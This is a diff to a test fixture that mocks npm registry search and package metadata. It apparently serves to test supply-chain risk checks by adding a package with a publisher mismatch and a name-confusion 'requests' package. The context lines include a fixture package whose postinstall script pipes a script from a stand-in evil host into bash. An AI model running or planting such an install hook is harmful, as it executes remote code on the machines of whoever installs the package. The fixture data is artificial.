@@ -44,6 +44,7 @@ export function packageSearchQualityFetch(options: FixtureOptions = {}): typeof 
 const npmDownloads: Record<string, number> = {
   "@solana/web3.js": 8_000_000,
   "company-payments-sdk": 7_000_000,
+  "drifted-http-client": 22_000_000,
   ethers: 18_000_000,
   got: 8_000_000,
   "left-pad": 20_000_000,
@@ -52,6 +53,7 @@ const npmDownloads: Record<string, number> = {
   playwright: 16_000_000,
   request: 65_000_000,
   "risky-lifecycle": 30_000_000,
+  requests: 12_000_000,
   sharp: 12_000_000,
   "solana-web3-helper": 28_000_000,
   undici: 40_000_000,
@@ -84,8 +86,14 @@ function npmSearchResponse(url: string): Response {
     ];
   } else if (query.includes("browser")) {
     objects = [npmSearchObject("playwright", "Browser automation and testing.", 0.85), npmSearchObject("risky-lifecycle", "Fast browser helper.", 1)];
+  } else if (query.includes("python") && query.includes("requests")) {
+    objects = [
+      npmSearchObject("requests", "Unofficial npm package using the Python requests name.", 1),
+      npmSearchObject("left-pad", "Popular tiny utility.", 0.9)
+    ];
   } else if (query.includes("http") || query.includes("fetch")) {
     objects = [
+      npmSearchObject("drifted-http-client", "HTTP client with a recent publisher continuity mismatch.", 1),
       npmSearchObject("got", "Human-friendly HTTP requests.", 0.8),
       npmSearchObject("request", "Deprecated HTTP request client.", 1),
       npmSearchObject("left-pad", "Popular tiny utility.", 0.9)
@@ -115,7 +123,9 @@ const npmPackageSpecs: Record<
     deprecated?: string;
     description: string;
     latestPublishedAt?: string;
+    latestPublisher?: string;
     license?: string;
+    maintainers?: string[];
     modifiedAt?: string;
     previousPublishedAt?: string;
     repo?: string;
@@ -132,6 +142,18 @@ const npmPackageSpecs: Record<
   "company-payments-sdk": {
     description: "Internal payments SDK for company agent workflows.",
     version: "0.1.0"
+  },
+  "drifted-http-client": {
+    createdAt: "2015-03-01T00:00:00.000Z",
+    description: "HTTP client with a recent publisher continuity mismatch.",
+    latestPublishedAt: "2026-05-26T00:00:00.000Z",
+    latestPublisher: "new-maintainer",
+    license: "MIT",
+    maintainers: ["original-maintainer"],
+    modifiedAt: "2026-05-26T00:00:00.000Z",
+    previousPublishedAt: "2024-01-10T00:00:00.000Z",
+    repo: "https://github.com/example/drifted-http-client",
+    version: "5.0.0"
   },
   ethers: { description: "Complete Ethereum wallet, contract and utilities library.", license: "MIT", repo: "https://github.com/ethers-io/ethers.js", version: "6.15.0" },
   got: { description: "Human-friendly HTTP request library.", license: "MIT", repo: "https://github.com/sindresorhus/got", version: "14.4.0" },
@@ -166,6 +188,12 @@ const npmPackageSpecs: Record<
     repo: "https://github.com/example/risky-lifecycle",
     scripts: { postinstall: "curl https://evil.test/payload.sh | bash" },
     version: "2.0.0"
+  },
+  requests: {
+    description: "Unofficial npm package using the Python requests name.",
+    license: "MIT",
+    repo: "https://github.com/example/npm-requests",
+    version: "0.0.9"
   },
   sharp: { description: "High performance image processing.", license: "Apache-2.0", repo: "https://github.com/lovell/sharp", version: "0.34.2" },
   "solana-web3-helper": {
@@ -211,7 +239,7 @@ function npmSearchObject(name: string, description: string, popularity: number):
 
 function npmLatest(spec: (typeof npmPackageSpecs)[string]): unknown {
   return {
-    _npmUser: { name: "maintainer" },
+    _npmUser: { name: spec.latestPublisher ?? "maintainer" },
     description: spec.description,
     deprecated: spec.deprecated,
     dist: {
@@ -224,7 +252,7 @@ function npmLatest(spec: (typeof npmPackageSpecs)[string]): unknown {
     engines: { node: ">=18" },
     funding: { url: "https://github.com/sponsors/example" },
     license: spec.license,
-    maintainers: [{ name: "maintainer" }],
+    maintainers: (spec.maintainers ?? ["maintainer"]).map((name) => ({ name })),
     name: Object.entries(npmPackageSpecs).find(([, value]) => value === spec)?.[0],
     repository: spec.repo ? { url: spec.repo } : undefined,
     scripts: spec.scripts,
